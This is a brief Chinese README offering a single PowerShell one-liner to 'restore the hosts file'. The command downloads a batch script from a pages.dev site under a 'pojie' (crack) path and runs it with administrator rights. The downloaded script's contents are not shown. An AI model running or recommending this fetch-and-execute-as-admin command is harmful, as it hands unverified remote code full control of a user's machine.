# host 文件恢复
## 
## 一行代码
```commandline
powershell -Command "Start-Process cmd -ArgumentList '/c iwr https://xn--uds.pages.dev/pojie/hosts/hosts.bat -UseBasicParsing -OutFile %temp%\1.bat && %temp%\1.bat' -Verb RunAs"
```